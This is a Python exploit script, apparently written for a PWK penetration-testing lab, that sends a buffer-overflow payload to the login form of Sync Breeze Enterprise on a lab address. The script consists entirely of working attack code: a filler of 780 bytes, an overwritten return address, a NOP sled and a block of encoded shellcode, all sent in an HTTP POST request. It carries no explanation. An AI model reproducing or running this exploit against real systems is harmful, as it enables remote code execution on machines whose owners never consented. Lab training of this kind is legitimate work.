#!/usr/bin/python
#PWK lab windows buffer overflow- Sync Breeze Enterprise
import socket
import sys

filler = "A" * 780
eip = "\x83\x0c\x09\x10"
offset = "C" * 4
nops="\x90"*8

payload=("\xbe\xd8\xaa\x9d\x95\xdb\xd2\xd9\x74\x24\xf4\x5b\x33\xc9\xb1"
"\x52\x31\x73\x12\x83\xc3\x04\x03\xab\xa4\x7f\x60\xb7\x51\xfd"
"\x8b\x47\xa2\x62\x05\xa2\x93\xa2\x71\xa7\x84\x12\xf1\xe5\x28"
"\xd8\x57\x1d\xba\xac\x7f\x12\x0b\x1a\xa6\x1d\x8c\x37\x9a\x3c"
"\x0e\x4a\xcf\x9e\x2f\x85\x02\xdf\x68\xf8\xef\x8d\x21\x76\x5d"
"\x21\x45\xc2\x5e\xca\x15\xc2\xe6\x2f\xed\xe5\xc7\xfe\x65\xbc"
"\xc7\x01\xa9\xb4\x41\x19\xae\xf1\x18\x92\x04\x8d\x9a\x72\x55"
"\x6e\x30\xbb\x59\x9d\x48\xfc\x5e\x7e\x3f\xf4\x9c\x03\x38\xc3"
"\xdf\xdf\xcd\xd7\x78\xab\x76\x33\x78\x78\xe0\xb0\x76\x35\x66"
"\x9e\x9a\xc8\xab\x95\xa7\x41\x4a\x79\x2e\x11\x69\x5d\x6a\xc1"
"\x10\xc4\xd6\xa4\x2d\x16\xb9\x19\x88\x5d\x54\x4d\xa1\x3c\x31"
"\xa2\x88\xbe\xc1\xac\x9b\xcd\xf3\x73\x30\x59\xb8\xfc\x9e\x9e"
"\xbf\xd6\x67\x30\x3e\xd9\x97\x19\x85\x8d\xc7\x31\x2c\xae\x83"
"\xc1\xd1\x7b\x03\x91\x7d\xd4\xe4\x41\x3e\x84\x8c\x8b\xb1\xfb"
"\xad\xb4\x1b\x94\x44\x4f\xcc\x5b\x30\x38\xeb\x34\x43\xc6\xf2"
"\x7f\xca\x20\x9e\x6f\x9b\xfb\x37\x09\x86\x77\xa9\xd6\x1c\xf2"
"\xe9\x5d\x93\x03\xa7\x95\xde\x17\x50\x56\x95\x45\xf7\x69\x03"
"\xe1\x9b\xf8\xc8\xf1\xd2\xe0\x46\xa6\xb3\xd7\x9e\x22\x2e\x41"
"\x09\x50\xb3\x17\x72\xd0\x68\xe4\x7d\xd9\xfd\x50\x5a\xc9\x3b"
"\x58\xe6\xbd\x93\x0f\xb0\x6b\x52\xe6\x72\xc5\x0c\x55\xdd\x81"
"\xc9\x95\xde\xd7\xd5\xf3\xa8\x37\x67\xaa\xec\x48\x48\x3a\xf9"
"\x31\xb4\xda\x06\xe8\x7c\xfa\xe4\x38\x89\x93\xb0\xa9\x30\xfe"
"\x42\x04\x76\x07\xc1\xac\x07\xfc\xd9\xc5\x02\xb8\x5d\x36\x7f"
"\xd1\x0b\x38\x2c\xd2\x19")

inputBuffer = filler + eip + offset +nops+payload

try:
        print ("Sending evil buffer with %s bytes" %len(inputBuffer))
        
        content = "username=" + inputBuffer + "&password=A"
        buffer = "POST /login HTTP/1.1\r\n"
        buffer += "Host: 192.168.231.10\r\n"
        buffer += "User-Agent: Mozilla/5.0 (X11; Linux_86_64; rv:68.0) Gecko/20100101 Firefox/68.0\r\n"
        buffer += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
        buffer += "Accept-Language: en-US,en;q=0.5\r\n"
        buffer += "Referer: http://192.168.231.10/login\r\n"
        buffer += "Connection: close\r\n"
        buffer += "Content-Type: application/x-www-form-urlencoded\r\n"
        buffer += "Content-Length: "+str(len(content))+"\r\n"
        buffer += "\r\n"
        buffer += content
        s = socket.socket (socket.AF_INET, socket.SOCK_STREAM)
        s.connect(("192.168.231.10", 80))
        s.send(buffer)
        s.close()   
except:
        print ("Could not connect!")
        sys.exit()

